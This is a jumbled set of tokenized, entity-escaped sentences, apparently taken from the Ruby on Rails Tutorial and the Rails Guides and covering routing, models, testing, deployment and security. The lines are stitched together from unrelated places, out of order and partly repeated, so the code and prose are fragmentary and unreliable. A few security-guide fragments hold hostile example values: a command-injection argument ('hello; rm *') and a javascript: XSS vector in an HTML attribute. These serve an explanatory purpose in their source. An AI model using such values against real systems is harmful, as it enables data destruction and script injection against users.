The \ emph { Ruby on Rails Tutorial } is a book on web development , not web design , but it would be depressing to work on an application that looks like \ emph { complete } crap , so in this section we &apos;ll add some structure to the layout and give it some minimal styling with CSS ▖ In addition to using some custom CSS rules , we &apos;ll make use of \ href { http : / / getbootstrap ▖ com / } { \ emph { Bootstrap } } , an open-source web design framework from Twitter .
create app / controllers / users _ controller ▖ rb
alert &quot; The article was deleted ▖ &quot;
( Figure ~ \ ref { fig : user _ model _ sketch } is just a sketch ; the full data model appears in Figure ~ \ ref { fig : user _ model _ initial } ▖ )
( Writing a test for email downcasing is left as an exercise ( Section ~ \ ref { sec : exercises _ uniqueness _ validation } ) ▖ )
# # # form _ for
1234567890123456 ▖ to _ s ( : human ) # = &gt; &quot; 1 ▖ 23 Quadrillion &quot;
# # # Time Constructors
For the resizing command , there are several possibilities listed in the \ href { http : / / www ▖ rdoc ▖ info / github / jnicklas / carrierwave / CarrierWave / MiniMagick } { MiniMagick documentation } , but the one we want is \ kode { resize \ _ to \ _ limit : &#91; 400 , 400 &#93; } , which resizes large images so that they aren &apos;t any bigger than 400px in either dimension , while simultaneously leaving smaller images alone .
We can conveniently test the data model above using the \ kode { followers ▖ include ? } \ method , as shown in Listing ~ \ ref { code : followers _ test } .
In all of these methods , `association` is replaced with the symbol passed as the first argument to `has _ one` ▖
end
The following sequence occurs : request 1 creates a user in memory that passes validation , request 2 does the same , request ~ 1 &apos;s user gets saved , request ~ 2 &apos;s user gets saved .
It failed .
/ home / ubuntu / workspace / sample _ app /
* Prefer class &lt; &lt; self over self ▖ method for class methods .
( The alert reader might notice at this point that the second \ kode { return } here is actually unnecessary---being the last expression in the function , the string \ kode { &quot; The string is nonempty ▖ &quot; } will be returned regardless of the \ kode { return } keyword , but using \ kode { return } in both places has a pleasing symmetry to it ▖ )
* = require _ tree .
&lt; % = text _ field : person , : email _ confirmation % &gt;
Practically all the software ╼ in the world is either broken or very difficult to use .
Since we will be including the stats on both the user show pages and the home page , the first line of Listing ~ \ ref { code : stats _ partial } picks the right one using
config ▖ action _ view ▖ sanitized _ allowed _ tags = &apos; table &apos; , &apos; tr &apos; , &apos; td&apos;
$ git checkout -b my _ new _ branch
This final chapter contains some of the most challenging material in the tutorial , including some Ruby / SQL trickery to make the status feed .
By the way , it &apos;s worth noting that , although we haven &apos;t actually tested for the presence of the links on the layout , our tests will fail if the routes aren &apos;t defined .
Here are two examples that clash with routes named `example _ path` :
The resulting layout appears in Listing ~ \ ref { code : application _ layout } .
# = &gt; 100 %
WARNING : There is seldom any good reason to use this option ▖
&#124; Response Class &#124; HTTP Status Code &#124; Symbol &#124;
For example
This change applies to most places in Rails where callbacks are used , including ╼ Active Record and Active Model callbacks , as well as filters in Action ╼ Controller ( e ▖ g ▖ `before _ action` ) .
# # # Generating a Controller
# Uncomment these lines on Windows .
In this context , it &apos;s helpful to have a set of guidelines on when we should test first ( or test at all ) .
We accomplish this with the \ kode { hidden \ _ field \ _ tag } method in Listing ~ \ ref { code : follow _ form } , which produces HTML of the form
app / assets / stylesheets / custom ▖ css ▖ scss
The code for the modified user show page appears in Listing ~ \ ref { code : user _ show _ with _ sidebar } .
Similarly , if a `before _ remove` callback throws an exception , the object does not get removed from the collection .
An `ArgumentError` exception will be raised if the argument passed does not respond to `include ? ` .
# Disable root element in JSON by default .
Active Support adds to `Time` many of the methods available for `DateTime` :
Note the notation \ kode { class UsersController &lt; ApplicationController } , which is an example of a Ruby \ emph { class } with \ emph { inheritance } .
# # # # Swapping a Middleware
You need to change your session key to something new , or remove all sessions :
* `update _ all`
Within a layout , you have access to three tools for combining different bits of output to form the overall response :
For complex class ╼ modifications , consider using `ActiveSupport : : Concern` .
create app / controllers / microposts _ controller ▖ rb
Adding the follower \ kode { belongs \ _ to } association to the Relationship model .
in Listing ~ \ ref { code : log _ out _ with _ forget } .
In addition to the routes for magazines , this declaration will also route ads to an `AdsController` ▖
validates _ each : name , : surname do &#124; record , attr , value &#124;
So , if you &apos;re using only the standard RESTful routes , no changes need to be made :
As with sessions ( Section ~ \ ref { sec : sessions _ and _ failed _ login } ) , we &apos;ll model account activations as a resource even though they won &apos;t be associated with an Active Record model .
To upgrade , simply add `gem &apos; dalli &apos; ` to your `Gemfile` .
Since the connection pooling is handled inside of Active Record by default , all application servers ( Thin , mongrel , Unicorn etc ▖ ) should behave the same ▖
Adding \ kode { has \ _ secure \ _ password } to the User model ▖
Another common question is whether to use tests from the start .
In the present context , a \ emph { hash } refers not to the Ruby data structure from Section ~ \ ref { sec : hashes _ and _ symbols } but rather to the result of applying an irreversible \ href { http : / / en ▖ wikipedia ▖ org / wiki / Hash _ function } { hash function } to input data ▖ )
Database files
Use your existing `secret _ key _ base` from the `secret _ token ▖ rb` initializer to ╼ set the SECRET _ KEY _ BASE environment variable for whichever users running the ╼ Rails application in production mode ▖
Recall from Listing ~ \ ref { code : signup _ form } that the signup form uses the \ kode { form \ _ for } helper , taking as an argument the user instance variable \ kode { @ user } :
in Listing ~ \ ref { code : microposts _ controller _ access _ control } .
var = bar
&#124; * * Success * * &#124; 200 &#124; : ok &#124;
Based on the fixtures in Listing ~ \ ref { code : users _ fixtures _ extra _ users } and Listing ~ \ ref { code : add _ micropost _ different _ owner } , this means that Michael should see Lana &apos;s posts and his own posts , but not Archer &apos;s posts .
# # # # Motivation
Digest : : SHA2 ▖ hexdigest ( File ▖ read ( Rails ▖ root ▖ join ( &apos; test / fixtures &apos; , path ) ) )
Its one argument is the right-hand side of the assignment , in this case the user to be signed in .
On the other hand , we have yet to respond properly when JavaScript is enabled .
&lt; Edit the commit message to make sense , and describe all your changes ▖ &gt;
ORDER BY clients ▖ created _ at desc &quot; )
When the desired behavior isn &apos;t yet crystal clear , lean toward writing the application code first , then write a test to codify the result .
In addition , since each row is a user , we would need to include the user &apos;s other attributes , including the name , password , etc .
As a result , when we deploy the application in Section ~ \ ref { sec : production _ webserver } , SSL will automatically be enabled .
When deciding when and how to test , it &apos;s helpful to understand \ emph { why } to test ▖ In my view , writing automated tests has three main benefits :
create app / assets / javascripts / static _ pages ▖ js ▖ coffee
We then implement code to get the test to pass , represented by the color green .
If you need to keep old behavior with no millisecond ╼ precision , set the following in an initializer :
Active Record lets you eager load any number of associations with a single `Model ▖ find` call by using an array , hash , or a nested hash of array / hash with the `includes` method .
Because cookies persist from one page to the next , they can store information ( such as a user id ) that can be used by the application to retrieve the logged-in user from the database .
&#91; rails ▖ js &#93; ( https : / / github ▖ com / rails / jquery-ujs / blob / master / src / rails ▖ js ) ╼ provides the JavaScript half , and the regular Ruby view helpers add appropriate ╼ tags to your DOM ▖
Validating the uniqueness of email addresses , ignoring case ▖
You can invoke `test _ jdbcmysql` , `test _ jdbcsqlite3` or `test _ jdbcpostgresql` also ▖
A slightly more advanced twist on associations is the _ polymorphic association _ ▖
Previously , they were gathered and then sorted alphabetically ▖
After installing Git , you should perform a set of one-time setup steps .
The results appear in Listing ~ \ ref { code : create _ password _ reset } .
( We place the \ kode { annotate } gem in a \ kode { group : development } block ( analogous to \ kode { group : test } ) because the annotations aren &apos;t needed in production applications ▖ )
We next install it with \ kode { bundle install } :
The sample users in production .
To test the logout machinery , we can add some steps to the user login test from Listing ~ \ ref { code : user _ login _ test _ valid _ information } .
format ▖ json do
as seen in Listing ~ \ ref { code : password _ migration } .
# action _ mailer / test _ case ▖ rb
render : edit
The result of Listing ~ \ ref { code : typography _ css } is shown in Figure ~ \ ref { fig : sample _ app _ typography } .
A \ kode { correct \ _ user } before filter to protect the edit / update pages ▖
$ bundle exec rake test ╼ 3 tests , 6 assertions , 3 failures , 0 errors , 0 skips
will generate a match for each item .
Although we &apos;ll keep individual user \ kode { show } pages visible to all site visitors , the user \ kode { index } will be restricted to signed-in users so that there &apos;s a limit to how much unregistered users can see by default .
make _ users
In all cases , the value must be exactly `false` and not any false value .
&quot; admin _ user &quot; ▖ camelize # = &gt; &quot; AdminUser &quot;
Configuring RSpec to automatically use Spork .
The weird \ kode { &#91; if lt IE 9 &#93; } syntax is \ emph { not } part of Rails ; it &apos;s actually a \ href { http : / / en ▖ wikipedia ▖ org / wiki / Conditional _ comment } { conditional comment } supported by Internet Explorer browsers for just this sort of situation .
Finally , our class defines a method called \ kode { formatted \ _ email } that uses the values of the assigned \ kode { @ name } and \ kode { @ email } variables to build up a nicely formatted version of the user &apos;s email address using string interpolation ( Section ~ \ ref { sec : strings } ) :
╼ ╼ \ subsection { Heroku setup } ╼ \ label { sec : heroku _ setup } ╼ ╼
You would place these controllers under the `app / controllers / admin` directory , and you can group them together in your router :
Rails comes equipped with three environments : \ texttt { test } , \ texttt { development } , and \ texttt { production } .
The SQL it executes looks like this :
of this software and associated documentation files ( the &quot; Software &quot; ) , to deal
But administrative users should see such links , and by clicking on a delete link we expect an admin to delete the user , i ▖ e ▖ , to change the \ kode { User } count by ~ \ kode { -1 } :
/ * header * /
in Listing ~ \ ref { code : layout _ login _ logout _ links } and
If you need to create routes for more than one resource , you can save a bit of typing by defining them all with a single call to `resources` :
&quot; equipment &quot; ▖ pluralize # = &gt; &quot; equipment &quot;
We &apos;ve seen lots of examples of using classes to instantiate objects , but we have yet to do so explicitly .
&lt; % = pagination _ links % &gt;
In analogy with the account activation mailer method test ( Listing ~ \ ref { code : real _ account _ activation _ test } ) , we &apos;ll write a short test of the password reset mailer method , as shown in Listing ~ \ ref { code : password _ reset _ mailer _ test } .
This object will be instantiated from the passed attributes , the link through its foreign key will be set , and , once it passes all of the validations specified on the associated model , the associated object _ will _ be saved .
Example of vulnerable code that could be used by attacker , if `deep _ munge` ╼ wasn &apos;t performed is :
class Base
$ cd rails
# # # Fork
There are many \ href { http : / / devcenter ▖ heroku ▖ com / heroku-command } { Heroku commands } , and we &apos;ll barely scratch the surface in this book .
To render content into a named `yield` , you use the `content _ for` method .
In particular , you can specify ╼ individual files and they are compiled in the order specified ▖
# # # # Sending Email With Name
Pass a ` : separator` to truncate the string at a natural break :
Additions to the default \ kode { Guardfile } .
Because we configured Bundler not to install production gems ( Section ~ \ ref { sec : sample _ app _ setup } ) , Listing ~ \ ref { code : unicorn _ config } won &apos;t add any gems to the development environment , but we still need to run Bundler to update \ kode { Gemfile ▖ lock } :
By having isolated routes such as this , if you wish to link to an area of an ╼ engine from within an application , you will need to use the engine &apos;s routing ╼ proxy method ▖
as shown in Listing ~ \ ref { code : user _ unfollow _ test } .
NOTE : Defined in `active _ support / core _ ext / string / conversions ▖ rb` .
in Listing ~ \ ref { code : branch _ raise } .
config ▖ middleware ▖ delete &quot; Rack : : MethodOverride &quot;
in Listing ~ \ ref { code : micropost _ partial _ with _ delete } and
Active Record gives us several mechanisms , the most important being the ability ╼ to :
This will send the supplied string to the browser with a MIME type of `text / javascript` .
The migration itself consists of a \ kode { change } method that determines the change to be made to the database .
WARNING ▖ If the collection is empty the root element is by default &quot; nil-classes &quot; ▖
render &quot; / path / to / rails / app / views / books / edit ▖ html ▖ erb &quot;
The \ kode { update } action needed to get the tests in Listing ~ \ ref { code : successful _ edit _ test } to pass is similar to the final form of the \ kode { create } action ( Listing ~ \ ref { code : signin _ upon _ signup } ) , as seen in Listing ~ \ ref { code : user _ update _ action } .
However , even that version has &#91; some security bugs &#93; ( http : / / www ▖ rorsecurity ▖ info / journal / 2008 / 10 / 13 / new-redcloth-security ▖ html ) , so the countermeasures still apply ▖
# config ▖ action _ dispatch ▖ x _ sendfile _ header = &quot; X-Sendfile &quot; # for Apache
# # # Special Treatment for Security Issues
# # # # stylesheet _ link _ tag
Code for a proposed Contact page .
You may note that , unlike the demo Users and Microposts controllers from Chapter ~ \ ref { cha : a _ toy _ app } , the Static Pages controller does not use the standard REST actions .
causes Guard to use the Spring server supplied by Rails to speed up loading times , while also preventing Guard from running the full test suite upon starting .
create app / controllers / blorgh / articles _ controller ▖ rb
* You could use a `before _ action` to populate the mail object with defaults , ╼ delivery _ method _ options or insert default headers and attachments .
create test / models / micropost _ test ▖ rb
# # # # # `uniq`
rescue NameError = &gt; e
The migration to add the attributes from Figure ~ \ ref { fig : user _ model _ password _ reset } appears as follows :
Let &apos;s get the rest of the user edit functionality working as well .
Even at this early stage , we &apos;re already going to deploy our ( nearly empty ) Rails application to production .
in Listing ~ \ ref { code : generate _ user _ mailer } .
On the other hand , as seen in Figure ~ \ ref { fig : invalid _ submission _ no _ feedback } , it doesn &apos;t display any feedback on invalid submissions ( apart from the development-only debug area ) , which is potentially confusing .
When you do a lot of programming , you quickly learn that one of the most common bits of control flow goes something like this :
followers
The first highlighted line in Listing ~ \ ref { code : find _ authenticate _ user } pulls the user out of the database using the submitted email address .
You can use any of the standard &#91; querying methods &#93; ( active _ record _ querying ▖ html ) inside the scope block ▖
* ` : source _ type`
Let &apos;s write tests to arrange that .
`therubyrhino` is the recommended runtime for JRuby users and is added by ╼ default to the `Gemfile` in apps generated under JRuby ▖
Introduction to Rack
Finally , our class defines a method called \ kode { formatted \ _ email } that uses the values of the assigned \ kode { @ name } and \ kode { @ email } variables to build up a nicely formatted version of the user &apos;s email address using string interpolation ( Section ~ \ ref { sec : strings } ) :
A resource route maps a number of related requests to actions in a single controller .
* testing environment :
* * app / views / layouts / application ▖ html ▖ erb * *
NOTE : Defined in `active _ support / core _ ext / object / to _ param ▖ rb` .
You &apos;re on your branch now , so you can write whatever you want ( make sure you &apos;re on the right branch with `git branch -a` ) ▖
We start by changing the format from RDoc to Markdown :
= &gt; true
The `object` option can be used to directly specify which object is rendered into the partial ; useful when the template &apos;s object is elsewhere ( eg ▖ in a different instance variable or in a local variable ) .
Once we have made the new comment , we send the user back to the original article ╼ using the `article _ path ( @ article ) ` helper ▖
If true then any error will cause detailed debugging information to be dumped in the HTTP response , and the `Rails : : Info` controller will show the application runtime context in ` / rails / info / properties` ▖
The following example will yield to the supplied block an array of up to 1000 invoices at a time , with the final block containing any remaining invoices :
( By the way , all of these methods--- \ kode { count } , \ kode { empty ? } , and \ kode { any ? } ---work on Ruby arrays as well .
NOTE : Mail will automatically Base64 encode an attachment ▖
The purpose of \ kode { current \ _ user } is to allow constructions such as
With this declaration , Rails will keep the cache value up to date , and then return that value in response to the `size` method .
# # # # A note about media types
Writing it will occupy the rest of this section .
The Home page after creating a new micropost .
_ user _ objects ( end ) ╼ ╼ \ subsection { Updating user objects } % ( fold ) ╼ \ label { sec : updating _ user _ objects } ╼ ╼
Rails is attempting to find a template called ╼ `articles / new` within `app / views` for the application ▖
has _ and _ belongs _ to _ many : assemblies , class _ name : &quot; Gadget &quot;
The `rake db : migrate` command needs to be run here to ensure that our ╼ application has the `users` table for future use .
We can get the routing for / users / 1 to work by adding a single line to our routes file ( \ kode { config / routes ▖ rb } ) :
# = &gt; { &quot; &quot; = &gt; nil , &quot; 1 &quot; = &gt; 1 , &quot; NESTED &quot; = &gt; { &quot; A &quot; = &gt; 3 , &quot; 5 &quot; = &gt; 5 } }
The method also accepts options like ` : dasherize` and friends , they are forwarded to the builder .
Together , these commands combine RVM and Bundler magic to ensure that commands such as \ kode { rake } and \ kode { rspec } are automatically executed in the right environment .
Before proceeding , be sure to commit and merge your changes if you &apos;re using Git for version control :
A \ kode { create } action that can handle signup failure ( but not success ) .
if @ article ▖ save
In lists of options , parameters , etc ▖ use a hyphen between the item and its description ( reads better than a colon because normally options are symbols ) :
# # # Example Action Mailer Configuration
Here &apos;s the development section :
This is because Rails automatically infers from \ kode { redirect \ _ to @ user } that we want to redirect to \ kode { user \ _ url ( @ user ) } .
as seen in Listing ~ \ ref { code : validates _ presence _ of _ email } .
Note that Listing ~ \ ref { code : demo _ gemfile _ sqlite _ version _ redux } is identical to Listing ~ \ ref { code : gemfile _ pg _ gem } .
It &apos;s reasonable to ask why we should reinvent the wheel .
/ log / * ▖ log
Active Job is a framework for declaring jobs and making them run on a variety ╼ of queueing backends ▖
* If `value` responds to `to _ xml` the method is invoked with `key` as ` : root` .
In this section , we &apos;ll write one such test to verify the correct behavior upon invalid form submission ; in Section ~ \ ref { sec : a _ test _ for _ valid _ submission } , we &apos;ll write a corresponding test for valid submission .
&#124; 1 &#124; SIMPLE &#124; articles &#124; ALL &#124; NULL &#124;
user = User ▖ find _ by ( name : &apos; David &apos; )
* ` : last _ word _ connector` : What is used to join the last items of an array with 3 or more elements ▖
To use this generator , open a terminal , navigate to a directory where you have ╼ rights to create files , and type :
# # # Page Change Events
We reuse the `article _ params` method that we defined earlier for the create ╼ action .
302 ▖ 24398923423 ▖ to _ s ( : percentage , precision : 5 )
to verify that our code is now Red ( failing tests ) .
A summary of the default Rails files appears in Table ~ \ ref { table : rails _ directory _ structure } ; we &apos;ll learn about most of these files and directories throughout the rest of this book .
Luckily , the solution is straightforward to implement ; we just need to enforce uniqueness at the database level as well .
In particular , for this third edition I am pleased to partner with Cloud9 to offer a development environment specifically tailored to the needs of this tutorial .
Note here the hidden input field
Development ╼ mode will work as expected .
As usual , if you &apos;re using Git for version control , now would be a good time to make a new branch :
create app / views / microposts / new ▖ html ▖ erb
There may be times when you wish to customize the query used by `belongs _ to` ▖
As in previous chapters , we will find it convenient to use the seed data Rake task to fill the database with sample relationships .
errors &#91; : name &#93; = &quot; cannot contain the characters !
The application signs users out by deleting the session &apos;s user id and removing the permanent cookie from the browser .
You can use the `errors ▖ full _ messages` or `errors ▖ to _ a` methods to view the messages in the form they might be displayed to a user ▖
* Access-Control-Allow-Origin
Although we could use SSL on just the signup page , it &apos;s actually easier to implement it site-wide , which has the additional benefits of securing user login ( Chapter ~ \ ref { cha : log _ in _ log _ out } ) and making our application immune to a critical \ emph { session hijacking } vulnerability discussed in Section ~ \ ref { sec : remember _ me } .
resources : photos
The way to do this is to use \ kode { attr \ _ accessor } to create an accessible attribute , which we saw before in Section ~ \ ref { sec : a _ user _ class } :
Analogously to `DateTime` , the predicates `past ? ` , and `future ? ` are relative to `Time ▖ current` .
# # # config / environments / test ▖ rb
encoding : unicode
The core of this test is the expectation that the following and follower counts appear on the page , together with the right URLs :
A profile with an unfollow button and incremented followers count .
* * `ActiveSupport : : Cache : : Strategy : : LocalCache : : Middleware` * *
But you don &apos;t have to do everything ╼ without help ▖
Client ▖ count
Notice that only _ one _ migration was copied over here ▖
The new record might not be saved to the database ; that depends on whether validations passed or not ( just like `create` ) .
The order here is \ kode { &apos; created \ _ at DESC &apos; } , where \ kode { DESC } is SQL for ``descending &apos; &apos; , i ▖ e ▖ , in descending order from newest to oldest .
This code contains an SQL subselect , and internally the entire select for user ~ 1 would look something like this :
( As in Section ~ \ ref { sec : planning _ the _ application } , note that users of the cloud IDE can create this project in the same workspace as the applications from the previous two chapters .
digest
validates : email , confirmation : true
&lt; table background = &quot; javascript : alert ( &apos; Hello &apos; ) &quot; &gt;
Trying them both reveals that the latter works .
\ emph { Extra credit } : Show that Rails supports non- \ href { http : / / es ▖ wikipedia ▖ org / wiki / ASCII } { ASCII } characters by including an inverted exclamation point , as in `` ¡ Hola , mundo ! &apos; &apos; ( Figure ~ \ ref { fig : hola _ mundo } )
NOTE : Make sure your queueing backend &quot; listens &quot; on your queue name ▖
Solutions Manual for Exercises
By far the two most popular sites for hosting Git repositories are GitHub and Bitbucket .
Rails Contributors
Install spring using `bundle install` .
For example , the \ href { https : / / github ▖ com / rails / rails / blob / master / activemodel / lib / active _ model / secure _ password ▖ rb } { source code } of \ kode { has \ _ secure \ _ password } makes this mistake , as did the first two editions of this tutorial .
# = &gt; &#91; &quot; cannot contain the characters !
By design , the bcrypt algorithm produces a \ href { https : / / en ▖ wikipedia ▖ org / wiki / Salt _ ( cryptography ) } { salted hash } , which protects against two important classes of attacks ( \ href { https : / / en ▖ wikipedia ▖ org / wiki / Dictionary _ attack } { dictionary attacks } and \ href { https : / / en ▖ wikipedia ▖ org / wiki / Rainbow _ table } { rainbow table attacks } ) .
This is because using the newer syntax to write
The method `stringify _ keys` returns a hash that has a stringified version of the keys in the receiver ▖
- &#91; Apache &#93; ( https : / / tn123 ▖ org / mod _ xsendfile / )
Go ahead and run the migration :
The reason this works is that the \ kode { change } method knows that \ kode { drop \ _ table } is the inverse of \ kode { create \ _ table } , which means that the rollback migration can be easily inferred .
&quot; It worked ! &quot;
{ c : 3 , b : 2 , a : 1 } ▖ to _ query # = &gt; &quot; a = 1 &amp; b = 2 &amp; c = 3 &quot;
The functionality will be utterly under-developed , and many of the steps will seem like magic , but worry not : the full sample app will develop a similar application from the ground up starting in Chapter ~ \ ref { cha : static _ pages } , and I will provide plentiful forward-references to later material .
+ ---- + ------------- + ------- + ------- + --------------- +
&quot; John Smith &quot; ▖ parameterize # = &gt; &quot; john-smith &quot;
we can access `field _ error _ proc` in views .
Unfortunately , this means that creating users can bog down the test suite ; happily , there is an easy fix .
Then reset the database :
The resulting correspondence of URLs , actions , and named routes is shown in Table ~ \ ref { table : RESTful _ users } .
DOCTYPE html &gt;
I &apos;d also like to thank Debra Williams Cauley , my editor on both \ emph { RailsSpace } and the \ emph { Ruby on Rails Tutorial } ; as long as she keeps taking me to baseball games , I &apos;ll keep writing books for her .
render body : &quot; raw &quot;
Configurable with `config ▖ action _ dispatch ▖ x _ sendfile _ header` .
&lt; % = auto _ discovery _ link _ tag ( : rss , { action : &quot; feed &quot; } ,
This uses the html-scanner tokenizer and so its HTML parsing ability is limited by that of html-scanner .
def self ▖ author _ class
# # # FormTagHelper
&quot; Home &quot;
create app / assets / stylesheets / microposts ▖ css ▖ scss
has _ many : readings
The \ kode { MicropostsController } class , highlighting inheritance .
Third-party code such as plugins and gems
Structuring Layouts
class _ attribute : default _ params
Now all of the following will produce the expected join queries using `INNER JOIN` :
The users index with delete links .
Rails routing supports nested routes .
Ruby supports object inheritance .
system ( &quot; / bin / echo &quot; , &quot; hello ; rm * &quot; )
Here we &apos;re using `link _ to` in a different way ▖
For example , suppose you have some &quot; expert &quot; users that should see different pages from &quot; normal &quot; users ▖
Rails provides quite a bit of built-in support for building web pages with this ╼ technique ▖
In this section , we will implement the basic interface and following / unfollowing functionality shown in those mockups .
In this case it will look for templates at `app / views / notifications` with name ╼ `another` ▖
Tests for the post-save behavior in the \ kode { create } action .
= &gt; &#91; 17 , 8 , 42 &#93;
For those familiar with JavaScript , this functionality is comparable to using a built-in class prototype object to augment the class .
You can also use `any ? ` and `many ? ` to check for existence on a model or relation .
SCSS for styling the user show page , including the sidebar .
If you are sure you will not subtemplate the `News` layout , you can replace the `content _ for ? ( : news _ content ) ? yield ( : news _ content ) : yield` with simply `yield` .
_ It is very important to filter malicious input , but it is also important to escape the output of the web application _ .
% w ( ▖ js ▖ css ) ▖ include ? (
To change defaults for multiple uses , for example adding table tags to the default :
Now people will only need to go to the root of the engine to see all the articles , ╼ rather than visiting ` / articles` ▖
number _ with _ precision ( 111 ▖ 2345 , 2 ) # = &gt; 111 ▖ 23
# Generates a date select that defaults to the date provided ( six days after today )
At this point , you should verify that you can sign in , close the browser , and then still be signed in when you visit the sample application .
Because the \ kode { gravatar \ _ for } method is undefined , the user show view is currently broken .
The default error message for this helper is _ &quot; is not included in the list &quot; _ .
In this section , we &apos;ll write a short integration test for some of the other elements on the profile page , including the work from this section .
This validation is very specific to web applications and this ╼ &apos; acceptance &apos; does not need to be recorded anywhere in your database ( if you ╼ don &apos;t have a field for it , the helper will just create a virtual attribute ) .
* `association ( force _ reload = false ) `
------------------------------
Header unset ETag
# # # Using Nested Layouts
&#124; &#124; 416 &#124; : requested _ range _ not _ satisfiable &#124;
One of these is the new application generator , ╼ which will provide you with the foundation of a fresh Rails application so that ╼ you don &apos;t have to write it yourself .
class B &lt; A ; end
and replace it with
The `inclusion` helper has an option ` : in` that receives the set of values that ╼ will be accepted ▖
Sooner or later , most Rails developers will see the error message &quot; Can only render or redirect once per action &quot; ▖
allows Rails to infer that the \ kode { action } of the form should be to \ texttt { POST } to the URL / users , in the case of sessions we need to indicate the \ emph { name } of the resource and the corresponding URL
A particularly useful trick is to use the index -1 at the end of the range to select every element from the starting point to the end of the array \ emph { without } explicitly having to use the array &apos;s length :
So far , the Sessions controller actions have followed the RESTful convention of using \ kode { new } for a login page and \ kode { create } to complete the login .
# # # Bi-directional Associations
* How to load all extensions .
A test for rendering the feed on the Home page .
The syntax is simple , relying on Ruby blocks and custom methods to define the attributes of the desired object .
class MysqlAdapter &lt; AbstractAdapter
RSpec &apos;s \ texttt { let } method provides a convenient way to create local variables inside tests .
Indeed , the Bootstrap framework defines a large number of variables for colors , available online on the \ href { http : / / getbootstrap ▖ com / customize / # less-variables } { Bootstrap page of Less variables } .
Linking the button to the signup page .
self ▖ locking _ column = : lock _ client _ column
In addition , both examples reference the \ kode { page } variable .
This kind of code requires the existence of a \ kode { signed \ _ in ? } \ boolean , which we &apos;ll now define .
He got around it by sending a GET to the page right before adding a user and parsing the result for the CSRF token .
Directives are processed top to bottom , but the order in which files are ╼ included by `require _ tree` is unspecified ▖
&#124; PATCH / PUT &#124; / photos / : id &#124; images # update &#124; photo _ path ( : id ) &#124;
You can do file globbing as well using ` @ import &quot; * &quot; ` , and ` @ import &quot; * * / * &quot; ` to add the whole tree which is equivalent to how `require _ tree` works ▖
format ▖ atom
# # # `truncate`
def show
Please note that you should wait to set `secret _ key _ base` until you have 100 % of your userbase on Rails 4 ▖ x and are reasonably sure you will not need to rollback to Rails 3 ▖ x ▖
The `belongs _ to` association supports these options :
In this section , we &apos;ll change the \ kode { README ▖ rdoc } file to \ kode { README ▖ md } , while taking the opportunity to add some Rails Tutorial--specific content to the README file .
def destroy
In particular , persistent cookies are vulnerable to \ href { http : / / en ▖ wikipedia ▖ org / wiki / Session _ hijacking } { session hijacking } , in which an attacker uses a stolen remember token to log in as a particular user .
1 ▖ megabyte # = &gt; 1048576
config ▖ middleware ▖ insert _ after ActiveRecord : : QueryCache , Lifo : : Cache , page _ cache : false
date ▖ advance ( months : 2 , days : -2 ) # = &gt; Wed , 04 Aug 2010
Because we &apos;ll need to log the user in , we also have to include a valid password to compare with the password submitted to the Sessions controller &apos;s \ kode { create } action .
Here I &apos;ve used the usual Ruby convention of putting an extra space at the two ends of the hash---a convention ignored by the console output .
Finally , in Chapter ~ \ ref { cha : account _ activation _ and _ password _ reset } we &apos;ll add account activation ( thereby confirming a valid email address ) and password resets .
* ` : location` - The location of the sendmail executable ▖
In the present design , an attacker with both cookies can log in as the user only until the user logs out ▖ )
In Section ~ \ ref { sec : signup _ error _ messages } , we &apos;ll see how to propagate this requirement up to the signup form for creating new users .
Thanks to reader Yoel Adler for pointing out this subtle issue , and for discovering the solution .
This option ╼ is off by default , but can be enabled if your server supports it ▖
Notice how many files and directories the \ kode { rails } command creates .
Conditions can either be specified as a string , array , or hash .
Converting these requirements to assertions and recalling that the \ kode { feed } is in the User model ( Listing ~ \ ref { code : proto _ status _ feed } ) gives the updated User model test shown in Listing ~ \ ref { code : full _ feed _ test } .
Accepts a valid week day symbol ( e ▖ g ▖ ` : monday` ) .
Then merge back into the master branch and push to the remote repository :
If you look in the `db / migrate / 20140120191729 _ create _ articles ▖ rb` file ( remember , ╼ yours will have a slightly different name ) , here &apos;s what you &apos;ll find :
email = michael % 40michaelhartl ▖ com ╼ ╼ This link will expire in two hours .
X-Runtime : 0 ▖ 083496
First , we need to add some configuration to our application &apos;s development environment , as shown in Listing ~ \ ref { code : development _ email _ settings } .
as shown in Listing ~ \ ref { code : log _ out _ with _ forget } .
Following the practice from Section ~ \ ref { sec : requiring _ logged _ in _ users } , we &apos;ll put action-level tests of access control in the Users controller test file .
# via an association
Without this change , the application ╼ would serve the precompiled assets from ` / assets` in development , and you would ╼ not see any local changes until you compile assets again .
Adding an \ kode { @ microposts } instance variable to the user \ kode { show } action .
message : &quot; % { value } is reserved ▖ &quot;
Based on the routes defined in Listing ~ \ ref { code : following _ followers _ actions _ routes } , we need to call them \ kode { following } and \ kode { followers } .
Fortunately Action Mailer provides hooks to intercept every ╼ email ▖
As in Listing ~ \ ref { code : email _ format _ validation _ tests } , Listing ~ \ ref { code : email _ format _ validation _ tests } includes a custom error message to identify the exact address causing any failure .
The engine that this guide covers provides submitting articles and commenting ╼ functionality and follows a similar thread to the &#91; Getting Started ╼ Guide &#93; ( getting _ started ▖ html ) , with some new twists .
We see here that the \ kode { nil } object doesn &apos;t itself respond to the \ kode { empty ? } \ method , but \ kode { nil ▖ to \ _ s } does .
Client ▖ order ( &quot; created _ at ASC &quot; )
Thus , in this case the behavior is different for `nil` , and the differences with `Kernel # Array` explained above apply to the rest of `object`s .
( This uses the \ kode { touch } trick from Section ~ \ ref { sec : green } en route , but you can create the file however you like ▖ )
as shown in Listing ~ \ ref { code : users _ controller _ test _ signup _ route } .
validate : expiration _ date _ cannot _ be _ in _ the _ past ,
A working preview method for password reset .
f shuffle ╼ &gt; &gt; self ▖ ? ( &apos; &apos; ) ▖ ? ▖ ? ╼ &gt; &gt; end ╼ &gt; &gt; end ╼ &gt; &gt; &quot; foobar &quot; ▖ shuffle ╼ = &gt; &quot; borafo &quot; ╼ \ end { code } ╼ \ end { codelisting } ╼ % subsection modifying _ built _ in _ classes ( end ) ╼ ╼ \ subsection { A controller class } % ( fold ) ╼ \ label { sec : a _ controller _ class } ╼ ╼
in Listing ~ \ ref { code : authenticated _ p _ fixed } and
Combining this with a \ kode { presence } validation ( Section ~ \ ref { sec : presence _ validation } ) to prevent nonblank passwords , this leads to the User model shown in Listing ~ \ ref { code : password _ implementation } .
In order to test the form submission , we need to issue a \ texttt { POST } request to the \ kode { users \ _ path } ( Table ~ \ ref { table : RESTful _ users } ) , which we can do with the \ kode { post } function :
A common pattern in stylesheets is having rules that apply to nested elements .
The cleanest way to do this is to reset the database with the \ kode { db : reset } Rake task :
Because we &apos;re inside the user model , we can also omit \ kode { self } , yielding the most idiomatically correct version :
In this case , each \ kode { div } has a CSS class as well .
